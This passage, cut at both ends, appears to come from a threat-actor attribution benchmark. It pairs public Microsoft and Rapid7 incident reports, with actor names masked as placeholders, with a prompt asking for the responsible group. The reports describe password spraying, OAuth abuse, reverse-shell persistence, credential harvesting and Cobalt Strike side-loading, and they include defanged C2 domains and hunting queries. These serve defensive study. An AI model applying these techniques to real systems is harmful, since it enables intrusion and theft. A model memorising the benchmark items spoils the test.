departments. At the same time, e-mail addresses of senders created on the public service "@outlook.com" can be formed using the employee's real surname and initials.    The sample letter contains "instructions" in Ukrainian for "updates to protect against hacker attacks", as well as graphical images of the process of launching a command line and executing a PowerShell command.    The mentioned command will download a PowerShell script that, simulating the process of updating the operating system, will download and execute the following PowerShell script designed to collect basic information about the computer using the "tasklist", "systeminfo" commands, and send the received results using HTTP request to the Mocky service API.    We recommend restricting the ability of users to run PowerShell and monitor network connections to the Mocky service API.
https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/	The Microsoft security team detected a nation-state attack on our corporate systems on January 12, 2024, and immediately activated our response process to investigate, disrupt malicious activity, mitigate the attack, and deny the threat actor further access. The Microsoft Threat Intelligence investigation identified the threat actor as [PLACEHOLDER], the Russian state-sponsored actor also known as [PLACEHOLDER]. The latest information from the Microsoft Security and Response Center (MSRC) is posted here.    As stated in the MSRC blog, given the reality of threat actors that are well resourced and funded by nation states, we are shifting the balance we need to strike between security and business risk – the traditional sort of calculus is simply no longer sufficient. For Microsoft, this incident has highlighted the urgent need to move even faster.    If the same team were to deploy the legacy tenant today, mandatory Microsoft policy and workflows would ensure MFA and our active protections are enabled to comply with current policies and guidance, resulting in better protection against these sorts of attacks.    Microsoft was able to identify these attacks in log data by reviewing Exchange Web Services (EWS) activity and using our audit logging features, combined with our extensive knowledge of [PLACEHOLDER]. In this blog, we provide more details on [PLACEHOLDER], our preliminary and ongoing analysis of the techniques they used, and how you may use this information pragmatically to protect, detect, and respond to similar threats in your own environment.    Using the information gained from Microsoft’s investigation into [PLACEHOLDER], Microsoft Threat Intelligence has identified that the same actor has been targeting other organizations and, as part of our usual notification processes, we have begun notifying these targeted organizations.    It’s important to note that this investigation is still ongoing, and we will continue to provide details as appropriate.    [PLACEHOLDER]  [PLACEHOLDER] (also known as [PLACEHOLDER]) is a Russia-based threat actor attributed by the US and UK governments as the Foreign Intelligence Service of the Russian Federation, also known as the SVR. This threat actor is known to primarily target governments, diplomatic entities, non-governmental organizations (NGOs) and IT service providers, primarily in the US and Europe. Their focus is to collect intelligence through longstanding and dedicated espionage of foreign interests that can be traced to early 2018. Their operations often involve compromise of valid accounts and, in some highly targeted cases, advanced techniques to compromise authentication mechanisms within an organization to expand access and evade detection.    [PLACEHOLDER] is consistent and persistent in their operational targeting, and their objectives rarely change. [PLACEHOLDER]’s espionage and intelligence gathering activities leverage a variety of initial access, lateral movement, and persistence techniques to collect information in support of Russian foreign policy interests. They utilize diverse initial access methods ranging from stolen credentials to supply chain attacks, exploitation of on-premises environments to laterally move to the cloud, and exploitation of service providers’ trust chain to gain access to downstream customers. [PLACEHOLDER] is also adept at identifying and abusing OAuth applications to move laterally across cloud environments and for post-compromise activity, such as email collection. OAuth is an open standard for token-based authentication and authorization that enables applications to get access to data and resources based on permissions set by a user.    [PLACEHOLDER] observed activity and techniques  Initial access through password spray    [PLACEHOLDER] utilized password spray attacks that successfully compromised a legacy, non-production test tenant account that did not have multifactor authentication (MFA) enabled. In a password-spray attack, the adversary attempts to sign into a large volume of accounts using a small subset of the most popular or most likely passwords. In this observed [PLACEHOLDER] activity, the actor tailored their password spray attacks to a limited number of accounts, using a low number of attempts to evade detection and avoid account blocks based on the volume of failures. In addition, as we explain in more detail below, the threat actor further reduced the likelihood of discovery by launching these attacks from a distributed residential proxy infrastructure. These evasion techniques helped ensure the actor obfuscated their activity and could persist the attack over time until successful.    Malicious use of OAuth applications    Threat actors like [PLACEHOLDER] compromise user accounts to create, modify, and grant high permissions to OAuth applications that they can misuse to hide malicious activity. The misuse of OAuth also enables threat actors to maintain access to applications, even if they lose access to the initially compromised account. [PLACEHOLDER] leveraged their initial access to identify and compromise a legacy test OAuth application that had elevated access to the Microsoft corporate environment. The actor created additional malicious OAuth applications. They created a new user account to grant consent in the Microsoft corporate environment to the actor controlled malicious OAuth applications. The threat actor then used the legacy test OAuth application to grant them the Office 365 Exchange Online full_access_as_app role, which allows access to mailboxes.    Collection via Exchange Web Services    [PLACEHOLDER] leveraged these malicious OAuth applications to authenticate to Microsoft Exchange Online and target Microsoft corporate email accounts.    Use of residential proxy infrastructure    As part of their multiple attempts to obfuscate the source of their attack, [PLACEHOLDER] used residential proxy networks, routing their traffic through a vast number of IP addresses that are also used by legitimate users, to interact with the compromised tenant and, subsequently, with Exchange Online. While not a new technique, [PLACEHOLDER]’s use of residential proxies to obfuscate connections makes traditional indicators of compromise (IOC)-based detection infeasible due to the high changeover rate of IP addresses.    Defense and protection guidance  Due to the heavy use of proxy infrastructure with a high changeover rate, searching for traditional IOCs, such as infrastructure IP addresses, is not sufficient to detect this type of [PLACEHOLDER] activity. Instead, Microsoft recommends the following guidance to detect and help reduce the risk of this type of threat:    Defend against malicious OAuth applications    Audit the current privilege level of all identities, users, service principals, and Microsoft Graph Data Connect applications (use the Microsoft Graph Data Connect authorization portal), to understand which identities are highly privileged. Privilege should be scrutinized more closely if it belongs to an unknown identity, is attached to identities that are no longer in use, or is not fit for purpose. Identities can often be granted privilege over and above what is required. Defenders should pay attention to apps with app-only permissions as those apps may have over-privileged access. Additional guidance for investigating compromised and malicious applications.  Audit identities that hold ApplicationImpersonation privileges in Exchange Online. ApplicationImpersonation allows a caller, such as a service principal, to impersonate a user and perform the same operations that the user themselves could perform. Impersonation privileges like this can be configured for services that interact with a mailbox on a user’s behalf, such as video conferencing or CRM systems. If misconfigured, or not scoped appropriately, these identities can have broad access to all mailboxes in an environment. Permissions can be reviewed in the Exchange Online Admin Center, or via PowerShell:  Get-ManagementRoleAssignment -Role ApplicationImpersonation -GetEffectiveUsers  Identify malicious OAuth apps using anomaly detection policies. Detect malicious OAuth apps that make sensitive Exchange Online administrative activities through App governance. Investigate and remediate any risky OAuth apps.  Implement conditional access app control for users connecting from unmanaged devices.  [PLACEHOLDER] has also been known to abuse OAuth applications in past attacks against other organizations using the EWS.AccessAsUser.All Microsoft Graph API role or the Exchange Online ApplicationImpersonation role to enable access to email. Defenders should review any applications that hold EWS.AccessAsUser.All and EWS.full_access_as_app permissions and understand whether they are still required in your tenant. If they are no longer required, they should be removed.  If you require applications to access mailboxes, granular and scalable access can be implemented using role-based access control for applications in Exchange Online. This access model ensures applications are only granted to the specific mailboxes required.  Protect against password spray attacks    Eliminate insecure passwords.  Educate users to review sign-in activity and mark suspicious sign-in attempts as “This wasn’t me”.  Reset account passwords for any accounts targeted during a password spray attack. If a targeted account had system-level permissions, further investigation may be warranted.  Detect, investigate, and remediate identity-based attacks using solutions like Microsoft Entra ID Protection.  Investigate compromised accounts using Microsoft Purview Audit (Premium).  Enforce on-premises Microsoft Entra Password Protection for Microsoft Active Directory Domain Services.  Use risk detections for user sign-ins to trigger multifactor authentication or password changes.  Investigate any possible password spray activity using the password spray investigation playbook.  Detection and hunting guidance  By reviewing Exchange Web Services (EWS) activity, combined with our extensive knowledge of [PLACEHOLDER], we were able to identify these attacks in log data. We are sharing some of the same hunting methodologies here to help other defenders detect and investigate similar attack tactics and techniques, if leveraged against their organizations. The audit logging that Microsoft investigators used to discover this activity was also made available to a broader set of Microsoft customers last year.    Identity alerts and protection    Microsoft Entra ID Protection has several relevant detections that help organizations identify these techniques or additional activity that may indicate anomalous activity that needs to be investigated. The use of residential proxy network infrastructure by threat actors is generally more likely to generate Microsoft Entra ID Protection alerts due to inconsistencies in patterns of user behavior compared to legitimate activity (such as location, diversity of IP addresses, etc.) that may be beyond the control of the threat actor.    The following Microsoft Entra ID Protection alerts can help indicate threat activity associated with this attack:    Unfamiliar sign-in properties – This alert flags sign-ins from networks, devices, and locations that are unfamiliar to the user.  Password spray – A password spray attack is where multiple usernames are attacked using common passwords in a unified brute force manner to gain unauthorized access. This risk detection is triggered when a password spray attack has been successfully performed. For example, the attacker has successfully authenticated in the detected instance.  Threat intelligence – This alert indicates user activity that is unusual for the user or consistent with known attack patterns. This detection is based on Microsoft’s internal and external threat intelligence sources.  Suspicious sign-ins (workload identities) – This alert indicates sign-in properties or patterns that are unusual for the related service principal.  XDR and SIEM alerts and protection    Once an actor decides to use OAuth applications in their attack, a variety of follow-on activities can be identified in alerts to help organizations identify and investigate suspicious activity.    The following built-in Microsoft Defender for Cloud Apps alerts are automatically triggered and can help indicate associated threat activity:    App with application-only permissions accessing numerous emails – A multi-tenant cloud app with application-only permissions showed a significant increase in calls to the Exchange Web Services API specific to email enumeration and collection. The app might be involved in accessing and retrieving sensitive email data.  Increase in app API calls to EWS after a credential update – This detection generates alerts for non-Microsoft OAuth apps where the app shows a significant increase in calls to Exchange Web Services API within a few days after its certificates/secrets are updated or new credentials are added.  Increase in app API calls to EWS – This detection generates alerts for non-Microsoft OAuth apps that exhibit a significant increase in calls to the Exchange Web Serves  API. This app might be involved in data exfiltration or other attempts to access and retrieve data.  App metadata associated with suspicious mal-related activity – This detection generates alerts for non-Microsoft OAuth apps with metadata, such as name, URL, or publisher, that had previously been observed in apps with suspicious mail-related activity. This app might be part of an attack campaign and might be involved in exfiltration of sensitive information.  Suspicious user created an OAuth app that accessed mailbox items – A user that previously signed on to a medium- or high-risk session created an OAuth application that was used to access a mailbox using sync operation or multiple email messages using bind operation. An attacker might have compromised a user account to gain access to organizational resources for further attacks.  The following Microsoft Defender XDR alert can indicate associated activity:    Suspicious user created an OAuth app that accessed mailbox items – A user who previously signed in to a medium- or high-risk session created an OAuth application that was used to access a mailbox using sync operation or multiple email messages using bind operation. An attacker might have compromised a user account to gain access to organizational resources for further attacks.  Related hunting queries  February 5, 2024 update: A query that was not working for all customers has been removed.    Microsoft Defender XDR customers can run the following query to find related activity in their networks:    Find MailItemsAccessed or SaaS actions performed by a labeled password spray IP  CloudAppEvents   | where Timestamp between (startTime .. endTime)   | where isnotempty(IPTags) and not(IPTags has_any('Azure','Internal Network IP','branch office'))   | where IPTags has_any ("Brute force attacker", "Password spray attacker", "malicious", "Possible Hackers")   Microsoft Sentinel customers can use the following analytic rules to find related activity in their network.    Password spray attempts – This query helps identify evidence of password spray activity against Microsoft Entra ID applications.  OAuth application being granted full_access_as_app permission – This detection looks for the full_access_as_app permission being granted to an OAuth application with Admin Consent. This permission provides access to Exchange mailboxes via the EWS API and could be exploited to access sensitive data. The application granted this permission should be reviewed to ensure that it is necessary for the application’s function.  Addition of services principal/user with elevated permissions – This rule looks for a service principal being granted permissions that could be used to add a Microsoft Entra ID object or user account to an Admin directory role.  Offline access via OAuth for previously unknown Azure application – This rule alerts when a user consents to provide a previously unknown Azure application with offline access via OAuth. Offline access will provide the Azure app with access to the resources without requiring two-factor authentication. Consent to applications with offline access should generally be rare.  Microsoft Sentinel customers can also use this hunting query:    OAuth apps reading mail both via GraphAPI and directly – This query returns OAuth Applications that access mail both directly and via Graph, allowing review of whether such dual access methods follow expected user patterns.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The Microsoft security team detected a nation-state attack on our corporate systems on January 12, 2024, and immediately activated our response process to investigate, disrupt malicious activity, mitigate the attack, and deny the threat actor further access. The Microsoft Threat Intelligence investigation identified the threat actor as [PLACEHOLDER], the Russian state-sponsored actor also known as [PLACEHOLDER]. The latest information from the Microsoft Security and Response Center (MSRC) is posted here.    As stated in the MSRC blog, given the reality of threat actors that are well resourced and funded by nation states, we are shifting the balance we need to strike between security and business risk – the traditional sort of calculus is simply no longer sufficient. For Microsoft, this incident has highlighted the urgent need to move even faster.    If the same team were to deploy the legacy tenant today, mandatory Microsoft policy and workflows would ensure MFA and our active protections are enabled to comply with current policies and guidance, resulting in better protection against these sorts of attacks.    Microsoft was able to identify these attacks in log data by reviewing Exchange Web Services (EWS) activity and using our audit logging features, combined with our extensive knowledge of [PLACEHOLDER]. In this blog, we provide more details on [PLACEHOLDER], our preliminary and ongoing analysis of the techniques they used, and how you may use this information pragmatically to protect, detect, and respond to similar threats in your own environment.    Using the information gained from Microsoft’s investigation into [PLACEHOLDER], Microsoft Threat Intelligence has identified that the same actor has been targeting other organizations and, as part of our usual notification processes, we have begun notifying these targeted organizations.    It’s important to note that this investigation is still ongoing, and we will continue to provide details as appropriate.    [PLACEHOLDER]  [PLACEHOLDER] (also known as [PLACEHOLDER]) is a Russia-based threat actor attributed by the US and UK governments as the Foreign Intelligence Service of the Russian Federation, also known as the SVR. This threat actor is known to primarily target governments, diplomatic entities, non-governmental organizations (NGOs) and IT service providers, primarily in the US and Europe. Their focus is to collect intelligence through longstanding and dedicated espionage of foreign interests that can be traced to early 2018. Their operations often involve compromise of valid accounts and, in some highly targeted cases, advanced techniques to compromise authentication mechanisms within an organization to expand access and evade detection.    [PLACEHOLDER] is consistent and persistent in their operational targeting, and their objectives rarely change. [PLACEHOLDER]’s espionage and intelligence gathering activities leverage a variety of initial access, lateral movement, and persistence techniques to collect information in support of Russian foreign policy interests. They utilize diverse initial access methods ranging from stolen credentials to supply chain attacks, exploitation of on-premises environments to laterally move to the cloud, and exploitation of service providers’ trust chain to gain access to downstream customers. [PLACEHOLDER] is also adept at identifying and abusing OAuth applications to move laterally across cloud environments and for post-compromise activity, such as email collection. OAuth is an open standard for token-based authentication and authorization that enables applications to get access to data and resources based on permissions set by a user.    [PLACEHOLDER] observed activity and techniques  Initial access through password spray    [PLACEHOLDER] utilized password spray attacks that successfully compromised a legacy, non-production test tenant account that did not have multifactor authentication (MFA) enabled. In a password-spray attack, the adversary attempts to sign into a large volume of accounts using a small subset of the most popular or most likely passwords. In this observed [PLACEHOLDER] activity, the actor tailored their password spray attacks to a limited number of accounts, using a low number of attempts to evade detection and avoid account blocks based on the volume of failures. In addition, as we explain in more detail below, the threat actor further reduced the likelihood of discovery by launching these attacks from a distributed residential proxy infrastructure. These evasion techniques helped ensure the actor obfuscated their activity and could persist the attack over time until successful.    Malicious use of OAuth applications    Threat actors like [PLACEHOLDER] compromise user accounts to create, modify, and grant high permissions to OAuth applications that they can misuse to hide malicious activity. The misuse of OAuth also enables threat actors to maintain access to applications, even if they lose access to the initially compromised account. [PLACEHOLDER] leveraged their initial access to identify and compromise a legacy test OAuth application that had elevated access to the Microsoft corporate environment. The actor created additional malicious OAuth applications. They created a new user account to grant consent in the Microsoft corporate environment to the actor controlled malicious OAuth applications. The threat actor then used the legacy test OAuth application to grant them the Office 365 Exchange Online full_access_as_app role, which allows access to mailboxes.    Collection via Exchange Web Services    [PLACEHOLDER] leveraged these malicious OAuth applications to authenticate to Microsoft Exchange Online and target Microsoft corporate email accounts.    Use of residential proxy infrastructure    As part of their multiple attempts to obfuscate the source of their attack, [PLACEHOLDER] used residential proxy networks, routing their traffic through a vast number of IP addresses that are also used by legitimate users, to interact with the compromised tenant and, subsequently, with Exchange Online. While not a new technique, [PLACEHOLDER]’s use of residential proxies to obfuscate connections makes traditional indicators of compromise (IOC)-based detection infeasible due to the high changeover rate of IP addresses.    Defense and protection guidance  Due to the heavy use of proxy infrastructure with a high changeover rate, searching for traditional IOCs, such as infrastructure IP addresses, is not sufficient to detect this type of [PLACEHOLDER] activity. Instead, Microsoft recommends the following guidance to detect and help reduce the risk of this type of threat:    Defend against malicious OAuth applications    Audit the current privilege level of all identities, users, service principals, and Microsoft Graph Data Connect applications (use the Microsoft Graph Data Connect authorization portal), to understand which identities are highly privileged. Privilege should be scrutinized more closely if it belongs to an unknown identity, is attached to identities that are no longer in use, or is not fit for purpose. Identities can often be granted privilege over and above what is required. Defenders should pay attention to apps with app-only permissions as those apps may have over-privileged access. Additional guidance for investigating compromised and malicious applications.  Audit identities that hold ApplicationImpersonation privileges in Exchange Online. ApplicationImpersonation allows a caller, such as a service principal, to impersonate a user and perform the same operations that the user themselves could perform. Impersonation privileges like this can be configured for services that interact with a mailbox on a user’s behalf, such as video conferencing or CRM systems. If misconfigured, or not scoped appropriately, these identities can have broad access to all mailboxes in an environment. Permissions can be reviewed in the Exchange Online Admin Center, or via PowerShell:  Get-ManagementRoleAssignment -Role ApplicationImpersonation -GetEffectiveUsers  Identify malicious OAuth apps using anomaly detection policies. Detect malicious OAuth apps that make sensitive Exchange Online administrative activities through App governance. Investigate and remediate any risky OAuth apps.  Implement conditional access app control for users connecting from unmanaged devices.  [PLACEHOLDER] has also been known to abuse OAuth applications in past attacks against other organizations using the EWS.AccessAsUser.All Microsoft Graph API role or the Exchange Online ApplicationImpersonation role to enable access to email. Defenders should review any applications that hold EWS.AccessAsUser.All and EWS.full_access_as_app permissions and understand whether they are still required in your tenant. If they are no longer required, they should be removed.  If you require applications to access mailboxes, granular and scalable access can be implemented using role-based access control for applications in Exchange Online. This access model ensures applications are only granted to the specific mailboxes required.  Protect against password spray attacks    Eliminate insecure passwords.  Educate users to review sign-in activity and mark suspicious sign-in attempts as “This wasn’t me”.  Reset account passwords for any accounts targeted during a password spray attack. If a targeted account had system-level permissions, further investigation may be warranted.  Detect, investigate, and remediate identity-based attacks using solutions like Microsoft Entra ID Protection.  Investigate compromised accounts using Microsoft Purview Audit (Premium).  Enforce on-premises Microsoft Entra Password Protection for Microsoft Active Directory Domain Services.  Use risk detections for user sign-ins to trigger multifactor authentication or password changes.  Investigate any possible password spray activity using the password spray investigation playbook.  Detection and hunting guidance  By reviewing Exchange Web Services (EWS) activity, combined with our extensive knowledge of [PLACEHOLDER], we were able to identify these attacks in log data. We are sharing some of the same hunting methodologies here to help other defenders detect and investigate similar attack tactics and techniques, if leveraged against their organizations. The audit logging that Microsoft investigators used to discover this activity was also made available to a broader set of Microsoft customers last year.    Identity alerts and protection    Microsoft Entra ID Protection has several relevant detections that help organizations identify these techniques or additional activity that may indicate anomalous activity that needs to be investigated. The use of residential proxy network infrastructure by threat actors is generally more likely to generate Microsoft Entra ID Protection alerts due to inconsistencies in patterns of user behavior compared to legitimate activity (such as location, diversity of IP addresses, etc.) that may be beyond the control of the threat actor.    The following Microsoft Entra ID Protection alerts can help indicate threat activity associated with this attack:    Unfamiliar sign-in properties – This alert flags sign-ins from networks, devices, and locations that are unfamiliar to the user.  Password spray – A password spray attack is where multiple usernames are attacked using common passwords in a unified brute force manner to gain unauthorized access. This risk detection is triggered when a password spray attack has been successfully performed. For example, the attacker has successfully authenticated in the detected instance.  Threat intelligence – This alert indicates user activity that is unusual for the user or consistent with known attack patterns. This detection is based on Microsoft’s internal and external threat intelligence sources.  Suspicious sign-ins (workload identities) – This alert indicates sign-in properties or patterns that are unusual for the related service principal.  XDR and SIEM alerts and protection    Once an actor decides to use OAuth applications in their attack, a variety of follow-on activities can be identified in alerts to help organizations identify and investigate suspicious activity.    The following built-in Microsoft Defender for Cloud Apps alerts are automatically triggered and can help indicate associated threat activity:    App with application-only permissions accessing numerous emails – A multi-tenant cloud app with application-only permissions showed a significant increase in calls to the Exchange Web Services API specific to email enumeration and collection. The app might be involved in accessing and retrieving sensitive email data.  Increase in app API calls to EWS after a credential update – This detection generates alerts for non-Microsoft OAuth apps where the app shows a significant increase in calls to Exchange Web Services API within a few days after its certificates/secrets are updated or new credentials are added.  Increase in app API calls to EWS – This detection generates alerts for non-Microsoft OAuth apps that exhibit a significant increase in calls to the Exchange Web Serves  API. This app might be involved in data exfiltration or other attempts to access and retrieve data.  App metadata associated with suspicious mal-related activity – This detection generates alerts for non-Microsoft OAuth apps with metadata, such as name, URL, or publisher, that had previously been observed in apps with suspicious mail-related activity. This app might be part of an attack campaign and might be involved in exfiltration of sensitive information.  Suspicious user created an OAuth app that accessed mailbox items – A user that previously signed on to a medium- or high-risk session created an OAuth application that was used to access a mailbox using sync operation or multiple email messages using bind operation. An attacker might have compromised a user account to gain access to organizational resources for further attacks.  The following Microsoft Defender XDR alert can indicate associated activity:    Suspicious user created an OAuth app that accessed mailbox items – A user who previously signed in to a medium- or high-risk session created an OAuth application that was used to access a mailbox using sync operation or multiple email messages using bind operation. An attacker might have compromised a user account to gain access to organizational resources for further attacks.  Related hunting queries  February 5, 2024 update: A query that was not working for all customers has been removed.    Microsoft Defender XDR customers can run the following query to find related activity in their networks:    Find MailItemsAccessed or SaaS actions performed by a labeled password spray IP  CloudAppEvents   | where Timestamp between (startTime .. endTime)   | where isnotempty(IPTags) and not(IPTags has_any('Azure','Internal Network IP','branch office'))   | where IPTags has_any ("Brute force attacker", "Password spray attacker", "malicious", "Possible Hackers")   Microsoft Sentinel customers can use the following analytic rules to find related activity in their network.    Password spray attempts – This query helps identify evidence of password spray activity against Microsoft Entra ID applications.  OAuth application being granted full_access_as_app permission – This detection looks for the full_access_as_app permission being granted to an OAuth application with Admin Consent. This permission provides access to Exchange mailboxes via the EWS API and could be exploited to access sensitive data. The application granted this permission should be reviewed to ensure that it is necessary for the application’s function.  Addition of services principal/user with elevated permissions – This rule looks for a service principal being granted permissions that could be used to add a Microsoft Entra ID object or user account to an Admin directory role.  Offline access via OAuth for previously unknown Azure application – This rule alerts when a user consents to provide a previously unknown Azure application with offline access via OAuth. Offline access will provide the Azure app with access to the resources without requiring two-factor authentication. Consent to applications with offline access should generally be rare.  Microsoft Sentinel customers can also use this hunting query:    OAuth apps reading mail both via GraphAPI and directly – This query returns OAuth Applications that access mail both directly and via Graph, allowing review of whether such dual access methods follow expected user patterns.
https://www.rapid7.com/blog/post/2024/05/10/ongoing-social-engineering-campaign-linked-to-black-basta-ransomware-operators/	Rapid7 has identified an ongoing social engineering campaign that has been targeting multiple managed detection and response (MDR) customers. The incident involves a threat actor overwhelming a user's email with junk and calling the user, offering assistance. The threat actor prompts impacted users to download remote monitoring and management software like AnyDesk or utilize Microsoft's built-in Quick Assist feature in order to establish a remote connection. Once a remote connection has been established, the threat actor moves to download payloads from their infrastructure in order to harvest the impacted users credentials and maintain persistence on the impacted users asset.  In one incident, Rapid7 observed the threat actor deploying Cobalt Strike beacons to other assets within the compromised network. While ransomware deployment was not observed in any of the cases Rapid7 responded to, the indicators of compromise we observed were previously linked with the [PLACEHOLDER] ransomware operators based on OSINT and other incident response engagements handled by Rapid7.  Overview Since late April 2024, Rapid7 identified multiple cases of a novel social engineering campaign. The attacks begin with a group of users in the target environment receiving a large volume of spam emails. In all observed cases, the spam was significant enough to overwhelm the email protection solutions in place and arrived in the user’s inbox. Rapid7 determined many of the emails themselves were not malicious, but rather consisted of newsletter sign-up confirmation emails from numerous legitimate organizations across the world.   Figure 1. Example spam email. With the emails sent, and the impacted users struggling to handle the volume of the spam, the threat actor then began to cycle through calling impacted users posing as a member of their organization’s IT team reaching out to offer support for their email issues. For each user they called, the threat actor attempted to socially engineer the user into providing remote access to their computer through the use of legitimate remote monitoring and management solutions. In all observed cases, Rapid7 determined initial access was facilitated by either the download and execution of the commonly abused RMM solution AnyDesk, or the built-in Windows remote support utility Quick Assist.  In the event the threat actor’s social engineering attempts were unsuccessful in getting a user to provide remote access, Rapid7 observed they immediately moved on to another user who had been targeted with their mass spam emails.  Once the threat actor successfully gains access to a user’s computer, they begin executing a series of batch scripts, presented to the user as updates, likely in an attempt to appear more legitimate and evade suspicion. The first batch script executed by the threat actor typically verifies connectivity to their command and control (C2) server and then downloads a zip archive containing a legitimate copy of OpenSSH for Windows (ultimately renamed to ***RuntimeBroker.exe***), along with its dependencies, several RSA keys, and other Secure Shell (SSH) configuration files. SSH is a protocol used to securely send commands to remote computers over the internet. While there are hard-coded C2 servers in many of the batch scripts, some are written so the C2 server and listening port can be specified on the command line as an override.   Figure 2. Initial batch script snippet  Figure 3. Compressed SSH files within s.zip. The script then establishes persistence via run key entries  in the Windows registry. The run keys created by the batch script point to additional batch scripts that are created at run time. Each batch script pointed to by the run keys executes SSH via PowerShell in an infinite loop to attempt to establish a reverse shell connection to the specified C2 server using the downloaded RSA private key. Rapid7 observed several different variations of the batch scripts used by the threat actor, some of which also conditionally establish persistence using other remote monitoring and management solutions, including NetSupport and ScreenConnect.   Figure 4. The batch script creates run keys for persistence. In all observed cases, Rapid7 has identified the usage of a batch script to harvest the victim’s credentials from the command line using PowerShell. The credentials are gathered under the false context of the “update” requiring the user to log in. In most of the observed batch script variations, the credentials are immediately exfiltrated to the threat actor’s server via a Secure Copy command (SCP). In at least one other observed script variant, credentials are saved to an archive and must be manually retrieved.   Figure 5. Stolen credentials are typically exfiltrated immediately.  Figure 6. Script variant with no secure copy for exfiltration. In one observed case, once the initial compromise was completed, the threat actor then attempted to move laterally throughout the environment via SMB using Impacket, and ultimately failed to deploy Cobalt Strike despite several attempts. While Rapid7 did not observe successful data exfiltration or ransomware deployment in any of our investigations, the indicators of compromise found via forensic analysis conducted by Rapid7 are consistent with the [PLACEHOLDER] ransomware group based on internal and open source intelligence.  Forensic Analysis In one incident, Rapid7 observed the threat actor attempting to deploy additional remote monitoring and management tools including ScreenConnect and the NetSupport remote access trojan (RAT). Rapid7 acquired the Client32.ini file, which holds the configuration data for the NetSupport RAT, including domains for the connection. Rapid7 observed the NetSupport RAT attempt communication with the following domains:  rewilivak13[.]com greekpool[.]com   Figure 7 - NetSupport RAT Files and Client32.ini Content After successfully gaining access to the compromised asset, Rapid7 observed the threat actor attempting to deploy Cobalt Strike beacons, disguised as a legitimate Dynamic Link Library (DLL) named 7z.DLL, to other assets within the same network as the compromised asset using the Impacket toolset.  In our analysis of 7z.DLL, Rapid7 observed the DLL was altered to include a function whose purpose was to XOR-decrypt the Cobalt Strike beacon using a hard-coded key and then execute the beacon.  The threat actor would attempt to deploy the Cobalt Strike beacon by executing the legitimate binary 7zG.exe and passing a command line argument of `b`, i.e. `C:\Users\Public\7zG.exe b`. By doing so, the legitimate binary 7zG.exe side-loads 7z.DLL, which in turn executes the embedded Cobalt Strike beacon. This technique is known as DLL side-loading, a method Rapid7 previously discussed in a blog post on the IDAT Loader.  Upon successful execution, Rapid7 observed the beacon inject a newly created process, choice.exe.   Figure 8 - Sample Cobalt Strike Configuration Mitigations Rapid7 recommends baselining your environment for all installed remote monitoring and management solutions and utilizing application allowlisting solutions, such as AppLocker or ​​Microsoft Defender Application Control, to block all unapproved RMM solutions from executing within the environment. For example, the Quick Assist tool, quickassist.exe, can be blocked from execution via AppLocker.  As an additional precaution, Rapid7 recommends blocking domains associated with all unapproved RMM solutions. A public GitHub repo containing a catalog of RMM solutions, their binary names, and associated domains can be found here.  Rapid7 recommends ensuring users are aware of established IT channels and communication methods to identify and prevent common social engineering attacks. We also recommend ensuring users are empowered to report suspicious phone calls and texts purporting to be from internal IT staff.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Rapid7 has identified an ongoing social engineering campaign that has been targeting multiple managed detection and response (MDR) customers. The incident involves a threat actor overwhelming a user's email with junk and calling the user, offering assistance. The threat actor prompts impacted users to download remote monitoring and management software like AnyDesk or utilize Microsoft's built-in Quick Assist feature in order to establish a remote connection. Once a remote connection has been established, the threat actor moves to download payloads from their infrastructure in order to harvest the impacted users credentials and maintain persistence on the impacted users asset.  In one incident, Rapid7 observed the threat actor deploying Cobalt Strike beacons to other assets within the compromised network. While ransomware deployment was not observed in any of the cases Rapid7 responded to, the indicators of compromise we observed were previously linked with the [PLACEHOLDER] ransomware operators based on OSINT and other incident response engagements handled by Rapid7.  Overview Since late April 2024, Rapid7 identified multiple cases of a novel social engineering campaign. The attacks begin with a group of users in the target environment receiving a large volume of spam emails. In all observed cases, the spam was significant enough to overwhelm the email protection solutions in place and arrived in the user’s inbox. Rapid7 determined many of the emails themselves were not malicious, but rather consisted of newsletter sign-up confirmation emails from numerous legitimate organizations across the world.   Figure 1. Example spam email. With the emails sent, and the impacted users struggling to handle the volume of the spam, the threat actor then began to cycle through calling impacted users posing as a member of their organization’s IT team reaching out to offer support for their email issues. For each user they called, the threat actor attempted to socially engineer the user into providing remote access to their computer through the use of legitimate remote monitoring and management solutions. In all observed cases, Rapid7 determined initial access was facilitated by either the download and execution of the commonly abused RMM solution AnyDesk, or the built-in Windows remote support utility Quick Assist.  In the event the threat actor’s social engineering attempts were unsuccessful in getting a user to provide remote access, Rapid7 observed they immediately moved on to another user who had been targeted with their mass spam emails.  Once the threat actor successfully gains access to a user’s computer, they begin executing a series of batch scripts, presented to the user as updates, likely in an attempt to appear more legitimate and evade suspicion. The first batch script executed by the threat actor typically verifies connectivity to their command and control (C2) server and then downloads a zip archive containing a legitimate copy of OpenSSH for Windows (ultimately renamed to ***RuntimeBroker.exe***), along with its dependencies, several RSA keys, and other Secure Shell (SSH) configuration files. SSH is a protocol used to securely send commands to remote computers over the internet. While there are hard-coded C2 servers in many of the batch scripts, some are written so the C2 server and listening port can be specified on the command line as an override.   Figure 2. Initial batch script snippet  Figure 3. Compressed SSH files within s.zip. The script then establishes persistence via run key entries  in the Windows registry. The run keys created by the batch script point to additional batch scripts that are created at run time. Each batch script pointed to by the run keys executes SSH via PowerShell in an infinite loop to attempt to establish a reverse shell connection to the specified C2 server using the downloaded RSA private key. Rapid7 observed several different variations of the batch scripts used by the threat actor, some of which also conditionally establish persistence using other remote monitoring and management solutions, including NetSupport and ScreenConnect.   Figure 4. The batch script creates run keys for persistence. In all observed cases, Rapid7 has identified the usage of a batch script to harvest the victim’s credentials from the command line using PowerShell. The credentials are gathered under the false context of the “update” requiring the user to log in. In most of the observed batch script variations, the credentials are immediately exfiltrated to the threat actor’s server via a Secure Copy command (SCP). In at least one other observed script variant, credentials are saved to an archive and must be manually retrieved.   Figure 5. Stolen credentials are typically exfiltrated immediately.  Figure 6. Script variant with no secure copy for exfiltration. In one observed case, once the initial compromise was 